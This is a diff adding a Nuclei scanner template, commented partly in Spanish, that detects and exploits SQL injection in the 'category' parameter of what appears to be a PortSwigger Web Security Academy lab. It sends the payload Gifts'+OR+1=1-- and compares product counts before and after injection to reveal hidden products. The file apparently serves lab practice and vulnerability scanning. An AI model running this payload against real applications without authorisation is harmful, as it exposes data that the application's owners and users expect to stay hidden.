@@ -1,0 +1,86 @@
+id: PORTSWIGGERLaboratorioInyecSQLclausulaWHERE
+info:
+  name: P4IM0NTEMPLATE Inyec SQL clausula WHERE
+  author: P4IM0N
+  severity: high
+  description: |
+    This template detects and exploits an SQL injection vulnerability in the 'category' parameter of a web application. It forces the application to display unreleased products by injecting a payload that bypasses the WHERE clause.
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-SQLi-Scanner
+        Accept: */*
+    extractors:
+      - type: regex
+        name: original_product_count
+        part: body
+        regex:
+          - '<img src="\/image\/productcatalog\/products\/\d+\.jpg">\s*<h3>(.*?)<\/h3>\s*<img.*?>\s*\$(\d+\.\d+)\s*<a.*?href="\/product\?productId=(\d+)"'
+        internal: true
+        group: 0
+
+      # Debug: Extraer el cuerpo completo de la respuesta original
+      - type: regex
+        name: original_body_debug
+        part: body
+        regex:
+          - '(.*)'  
+
+  - raw:
+      - |
+        GET /filter?category=Gifts'+OR+1=1-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-SQLi-Scanner
+        Accept: */*
+    matchers-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(original_product_count) < len(injected_product_count)' # Comparación clave
+      
+    
+    extractors:
+      - type: regex
+        name: injected_product_count
+        part: body
+        regex:
+          - '<img src="\/image\/productcatalog\/products\/\d+\.jpg">\s*<h3>(.*?)<\/h3>\s*<img.*?>\s*\$(\d+\.\d+)\s*<a.*?href="\/product\?productId=(\d+)"'
+        internal: true
+        group: 0
+
+      # Debug: Extraer el cuerpo completo de la respuesta inyectada
+      - type: regex
+        name: injected_body_debug
+        part: body
+        regex:
+          - '(.*)'  
+
+    stop-at-first-match: true
+    cookie-reuse: true
+    redirects: true
+    max-redirects: 3
+
+variables:
+  original_data: "{{original_product_count}}"
+  injected_data: "{{injected_product_count}}"
+
+extractors:
+  # Depuración: Mostrar los valores extraídos
+  - type: dsl
+    name: debug_original
+    dsl:
+      - "join(original_data, ' /////ORIGINAL PRODUCT////// ')"
+
+  - type: dsl
+    name: debug_injected
+    dsl:
+      - "join(injected_data, ' /////INYECTED PRODUCT////// ')"
+
+  # Comparativa numérica de productos
+  - type: dsl
+    name: product_comparison
+    dsl:
+      - "json({ 'original_count': len(original_data), 'injected_count': len(injected_data), 'difference': len(injected_data) - len(original_data) })"
